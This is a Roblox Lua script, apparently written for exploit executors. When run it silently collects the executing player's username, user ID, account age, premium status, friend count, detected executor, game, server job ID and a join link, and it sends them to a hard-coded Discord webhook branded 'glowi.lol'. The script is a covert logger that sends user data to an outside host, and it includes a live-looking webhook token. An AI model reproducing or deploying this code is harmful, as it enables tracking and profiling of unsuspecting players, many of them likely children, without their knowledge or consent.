local WEBHOOK_URL = "https://discord.com/api/webhooks/1379671345268264960/z9sv6yqrwOrsrQVtvgjvuOa_jH6Spf5z-H2eG4Q5MoSKFtqzo9H5ibe8hwO67x2fUmPK"

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Function to check if player has premium
local function hasPremium()
    return player.MembershipType == Enum.MembershipType.Premium
end

-- Function to make HTTP request (for getting friend count)
local function makeRequest(url)
    -- Try all known request methods
    local success, response
    
    -- Method 1: Synapse X / Script-Ware
    if syn and syn.request then
        success, response = pcall(function()
            return syn.request({
                Url = url,
                Method = "GET"
            })
        end)
    -- Method 2: KRNL and others
    elseif request then
        success, response = pcall(function()
            return request({
                Url = url,
                Method = "GET"
            })
        end)
    -- Method 3: HttpRequest
    elseif http_request then
        success, response = pcall(function()
            return http_request({
                Url = url,
                Method = "GET"
            })
        end)
    -- Method 4: AWP.GG
    elseif awpRequest then
        success, response = pcall(function()
            return awpRequest({
                Url = url,
                Method = "GET"
            })
        end)
    -- Method 5: Others
    elseif httpRequest then
        success, response = pcall(function()
            return httpRequest({
                Url = url,
                Method = "GET"
            })
        end)
    end
    
    if success and response then
        return response.Body or response.body
    end
    
    return nil
end

-- Function to get friend count using Roblox API
local function getFriendCount()
    local userId = player.UserId
    
    -- Try the direct API method first
    local success, result = pcall(function()
        return Players:GetFriendsCount(userId)
    end)
    
    if success and result and result > 0 then
        return result
    end
    
    -- Try using Roblox API
    local apiUrl = "https://friends.roblox.com/v1/users/" .. userId .. "/friends/count"
    local responseBody = makeRequest(apiUrl)
    
    if responseBody then
        -- Try to parse the JSON response
        success, result = pcall(function()
            return HttpService:JSONDecode(responseBody)
        end)
        
        if success and result and result.count ~= nil then
            return result.count
        end
    end
    
    -- Try an alternative endpoint
    apiUrl = "https://friends.roblox.com/v1/users/" .. userId .. "/friends"
    responseBody = makeRequest(apiUrl)
    
    if responseBody then
        -- Try to parse the JSON response
        success, result = pcall(function()
            local parsed = HttpService:JSONDecode(responseBody)
            if parsed and parsed.data then
                return #parsed.data
            end
            return 0
        end)
        
        if success and result then
            return result
        end
    end
    
    -- Fallback to online friends method as last resort
    success, result = pcall(function()
        return #player:GetFriendsOnline()
    end)
    
    if success and result then
        return result .. "+ (online)"
    end
    
    return "Unknown"
end

-- Function to get formatted time for footer
local function getFormattedTime()
    local hours = os.date("%H")
    local minutes = os.date("%M")
    
    -- Format as HH:MM
    return hours .. ":" .. minutes
end

-- Function to detect which executor is being used (UNIVERSAL DETECTION)
local function detectExecutor()
    -- Try to find ANY executor identification function
    local possibleIdentifyFunctions = {
        "identifyexecutor", "getexecutorname", "get_executor", "getexecutor", 
        "executor_name", "executorname", "executor", "getexec", "get_exec",
        "exploit_name", "exploitname", "exploitinfo", "getexploitname", "detect_exploit",
        "executor_detect", "client_name", "client_info", "clientinfo", "clientname",
        "sw_getidentification", "sw_getid", "detectexploit", "detectexploiter",
        "getscriptenvname", "getscriptenvironment", "getexploitenvironment", "getenv"
    }
    
    for _, funcName in ipairs(possibleIdentifyFunctions) do
        local success, result = pcall(function()
            -- Try to access this function in both global and _G contexts
            local func = _G[funcName] or getgenv()[funcName]
            if func and type(func) == "function" then
                local name = func()
                if name and type(name) == "string" and name ~= "" and name ~= "unknown" and name ~= "nil" then
                    return name
                end
            end
            return nil
        end)
        
        if success and result then
            return result
        end
    end
    
    -- Standard executor identify functions
    if identifyexecutor then
        return identifyexecutor()
    elseif getexecutorname then
        return getexecutorname()
    elseif get_executor then 
        return get_executor()
    end
    
    -- Check environment variables and globals that can identify executors
    local executorChecks = {
        -- Newly requested executors
        {var = "Solara", name = "Solara"},
        {var = "SOLARA_LOADED", name = "Solara"},
        {var = "isSolara", name = "Solara"},
        {var = "Xeno", name = "Xeno"},
        {var = "XENO_LOADED", name = "Xeno"},
        {var = "Swift", name = "Swift"},
        {var = "SWIFT_LOADED", name = "Swift"},
        {var = "isSwift", name = "Swift"},
        {var = "Velocity", name = "Velocity"},
        {var = "VELOCITY_LOADED", name = "Velocity"},
        {var = "Ronix", name = "Ronix"},
        {var = "RONIX_LOADED", name = "Ronix"},
        {var = "isRonix", name = "Ronix"},
        
        -- Major executors
        {var = "syn", name = "Synapse X"},
        {var = "KRNL_LOADED", name = "KRNL"},
        {var = "secure_load", name = "Sentinel"},
        {var = "is_sirhurt_closure", name = "SirHurt"},
        {var = "SHADOWEXPLOIT", name = "Shadow"},
        {var = "fluxus", name = "Fluxus"},
        {var = "awpRequest", name = "AWP.GG"},
        {var = "oxygen", name = "Oxygen U"},
        {var = "OXYGEN_LOADED", name = "Oxygen U"},
        {var = "IS_VIVA_LOADED", name = "Viva"},
        {var = "IS_ELECTRON_LOADED", name = "Electron"},
        {var = "IS_COCO_LOADED", name = "Coco Z"},
        {var = "IS_KIWI_LOADED", name = "Kiwi X"},
        {var = "IWXYI", name = "Iwxyi"}, 
        {var = "WrapGlobal", name = "WeAreDevs API"},
        {var = "PROTOSMASHER_LOADED", name = "ProtoSmasher"},
        {var = "IS_TRIGON_LOADED", name = "Trigon EVO"},
        {var = "EVON_LOADED", name = "Evon"},
        {var = "XAPIR", name = "Xapir"},
        {var = "ZYREX_LOADED", name = "Zyrex"},
        {var = "Sirhurtdevelopment", name = "SirHurt Development"},
        {var = "_G.EzHubLoaded", name = "EzHub"},
        {var = "easyexploits", name = "EasyExploits"},
        {var = "scriptware", name = "Script-Ware"},
        {var = "Elysian", name = "Elysian"},
        {var = "ElysianExecutor", name = "Elysian"},
        {var = "Delta", name = "Delta"},
        {var = "DELTA_LOADED", name = "Delta"},
        {var = "Comet", name = "Comet"},
        {var = "COMET_LOADED", name = "Comet"},
        {var = "Valyse", name = "Valyse"},
        {var = "VALYSE_LOADED", name = "Valyse"},
        {var = "exploit_type", name = function() return exploit_type end},
        {var = "_G.exploit", name = function() return _G.exploit end},
        {var = "Arceus", name = "Arceus X"},
        {var = "ARCEUS_LOADED", name = "Arceus X"},
        {var = "CacxTrinity", name = "Trinity"},
        -- More executors
        {var = "GarbageCleaner", name = "Celery"},
        {var = "Ran", name = "RainbowsARK"},
        {var = "RC_CREATE", name = "RC7"}
    }
    
    -- Optimized check for common executors (faster)
    if syn then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if identifyexecutor then return identifyexecutor() end
    if getexecutorname then return getexecutorname() end
    if fluxus then return "Fluxus" end
    if awpRequest then return "AWP.GG" end
    
    -- Check for specific executor identifying globals
    for _, check in ipairs(executorChecks) do
        local success, result = pcall(function()
            return _G[check.var] ~= nil or getgenv()[check.var] ~= nil
        end)
        
        if success and result then
            if type(check.name) == "function" then
                local success, name = pcall(check.name)
                if success and name then
                    return tostring(name)
                end
            else
                return check.name
            end
        end
    end
    
    -- Try to find the executor in the environment directly
    local function tryFindInEnv()
        local possibleNames = {
            "executor", "exploit", "client", "wrapper", "adapter", "module", 
            "application", "app", "soft", "script", "environment", "type"
        }
        
        for _, name in pairs(possibleNames) do
            if _G[name] then
                if type(_G[name]) == "string" then
                    return _G[name]
                elseif type(_G[name]) == "table" and _G[name].Name then
                    return _G[name].Name
                elseif type(_G[name]) == "table" and _G[name].name then
                    return _G[name].name
                elseif type(_G[name]) == "table" and _G[name].Identity then
                    return _G[name].Identity
                end
            end
        end
        
        return nil
    end
    
    local envResult = tryFindInEnv()
    if envResult then
        return envResult
    end
    
    -- JJSploit often defines jit
    if jit and not syn then
        return "JJSploit"
    end
    
    -- Check for debug.info which is used by Script-Ware
    if debug and debug.info and not syn then
        return "Script-Ware"
    end
    
    return "Unknown Executor"
end

-- Function to create a better join link
local function createJoinLink()
    local placeId = game.PlaceId
    local jobId = game.JobId
    
    -- Format for public servers that works better
    local joinLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=&gameId=" .. jobId
    
    return joinLink
end

-- Function to get user avatar thumbnail URL (Using proper Roblox API)
local function getAvatarURL()
    local userId = player.UserId
    
    -- Try the circular avatar API first (this is what the example script uses)
    local thumbnailUrl = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=true"
    local success, response = pcall(function()
        return HttpGet(thumbnailUrl)
    end)
    
    -- If HttpGet doesn't work, try our makeRequest function
    if not success then
        local responseBody = makeRequest(thumbnailUrl)
        if responseBody then
            success, response = pcall(function()
                return HttpService:JSONDecode(responseBody)
            end)
            
            if success and response and response.data and response.data[1] and response.data[1].imageUrl then
                return response.data[1].imageUrl
            end
        end
    else
        -- Try to decode the JSON from HttpGet
        success, response = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        
        if success and response and response.data and response.data[1] and response.data[1].imageUrl then
            return response.data[1].imageUrl
        end
    end
    
    -- Fallback to direct headshot URL if API call fails
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
end

-- Function to get user full body avatar URL
local function getFullBodyAvatarURL()
    -- Use full body avatar for variety
    return "https://www.roblox.com/avatar-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
end

-- Function to get user profile URL
local function getProfileURL()
    return "https://www.roblox.com/users/" .. player.UserId .. "/profile"
end

-- Calculate account age in more detailed format
local function getDetailedAccountAge()
    local ageInDays = player.AccountAge
    local years = math.floor(ageInDays / 365)
    local remainingDays = ageInDays % 365
    local months = math.floor(remainingDays / 30)
    local days = remainingDays % 30
    
    if years > 0 then
        return years .. " years, " .. months .. " months, " .. days .. " days"
    elseif months > 0 then
        return months .. " months, " .. days .. " days"
    else
        return days .. " days"
    end
end

-- Function to get user information
local function getUserInfo()
    local info = {
        Username = player.Name,
        DisplayName = player.DisplayName,
        UserId = player.UserId,
        AccountAge = getDetailedAccountAge(),
        Premium = hasPremium() and "Yes" or "No",
        FriendCount = getFriendCount(),
        GameId = game.PlaceId,
        GameName = "Unknown", -- We'll avoid MarketplaceService as it might be restricted
        JobId = game.JobId,
        TimeJoined = os.date("%Y-%m-%d %H:%M:%S"),
        CurrentTime = getFormattedTime(),
        JoinLink = createJoinLink(),
        AvatarURL = getAvatarURL(),
        FullBodyAvatarURL = getFullBodyAvatarURL(),
        ProfileURL = getProfileURL(),
        Executor = detectExecutor()
    }
    
    -- Try to get game name safely
    pcall(function()
        info.GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    return info
end

-- Function to safely do HttpGet with executor compatibility
function HttpGet(url)
    -- Try all possible methods to do an HttpGet
    if syn and syn.request then
        local response = syn.request({
            Url = url,
            Method = "GET"
        })
        return response.Body
    elseif request then
        local response = request({
            Url = url,
            Method = "GET"
        })
        return response.Body
    elseif http_request then
        local response = http_request({
            Url = url,
            Method = "GET"
        })
        return response.Body
    elseif httpRequest then
        local response = httpRequest({
            Url = url,
            Method = "GET"
        })
        return response.Body
    elseif game.HttpGet then
        -- Last resort, try Roblox's HttpGet if available
        return game:HttpGet(url)
    end
    
    -- If all methods fail
    error("No HTTP request function found")
end

-- Function to send to Discord webhook using executor's function
local function sendToWebhook()
    local userInfo = getUserInfo()
    
    -- Format the Discord embed with profile author header and link
    local embed = {
        author = {
            name = userInfo.DisplayName .. " (@" .. userInfo.Username .. ")",
            url = userInfo.ProfileURL,
            icon_url = userInfo.AvatarURL
        },
        title = "💥 Script Executed with " .. userInfo.Executor .. " 💥",
        description = "**This person executed the script!**\n\n**[🔗 Click to Join Them In-Game](" .. userInfo.JoinLink .. ")**",
        color = 16711680, -- RED color (decimal value)
        fields = {
            {
                name = "👤 Username",
                value = "`" .. userInfo.Username .. "`",
                inline = true
            },
            {
                name = "📝 Display Name",
                value = "`" .. userInfo.DisplayName .. "`",
                inline = true
            },
            {
                name = "🆔 User ID",
                value = "`" .. tostring(userInfo.UserId) .. "`",
                inline = true
            },
            {
                name = "🗓️ Account Age",
                value = "`" .. userInfo.AccountAge .. "`",
                inline = true
            },
            {
                name = "💎 Premium",
                value = "`" .. userInfo.Premium .. "`",
                inline = true
            },
            {
                name = "👥 Friends",
                value = "`" .. tostring(userInfo.FriendCount) .. "`",
                inline = true
            },
            {
                name = "👨‍💻 Executor",
                value = "`" .. userInfo.Executor .. "`",
                inline = true
            },
            {
                name = "🎮 Game",
                value = "`" .. userInfo.GameName .. " (" .. userInfo.GameId .. ")`",
                inline = false
            },
            {
                name = "🔢 Job ID",
                value = "`" .. userInfo.JobId .. "`",
                inline = false
            }
        },
        thumbnail = {
            url = userInfo.AvatarURL -- BIG AVATAR IN TOP RIGHT
        },
        image = {
            url = userInfo.FullBodyAvatarURL -- Full body avatar at the bottom
        },
        footer = {
            text = "glowi.lol has been executed • Today at 📆" .. userInfo.CurrentTime
        }
    }
    
    -- Create the webhook data
    local webhookData = {
        embeds = {embed},
        username = "glowi.lol"
    }
    
    -- Convert to JSON - compatible with most executors
    local jsonData = HttpService:JSONEncode(webhookData)
    
    -- Optimized request method for speed - try most common methods first
    local function tryRequest(method, url, data)
        if not method then return false end
        
        local success, result = pcall(function()
            return method({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = data
            })
        end)
        
        return success
    end
    
    -- Try the fastest methods first for better speed
    if syn and syn.request and tryRequest(syn.request, WEBHOOK_URL, jsonData) then
        return true
    elseif request and tryRequest(request, WEBHOOK_URL, jsonData) then
        return true
    elseif http_request and tryRequest(http_request, WEBHOOK_URL, jsonData) then
        return true
    elseif awpRequest and tryRequest(awpRequest, WEBHOOK_URL, jsonData) then
        return true
    elseif httpRequest and tryRequest(httpRequest, WEBHOOK_URL, jsonData) then
        return true
    end
    
    -- Try other methods if the fast ones failed
    local methods = {
        solara and solara.request,
        xeno and xeno.request,
        swift and swift.request,
        velocity and velocity.request,
        ronix and ronix.request,
        http and http.request,
        fluxus and fluxus.request,
        krnl and krnl.request,
        oxygen and oxygen.request
    }
    
    for _, method in pairs(methods) do
        if tryRequest(method, WEBHOOK_URL, jsonData) then
            return true
        end
    end
    
    -- Fallback to generic request
    return pcall(function()
        local requestFunc = request or http_request or httpRequest
        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        else
            error("No compatible HTTP request function found")
        end
    end)
end

-- Execute the webhook function
sendToWebhook()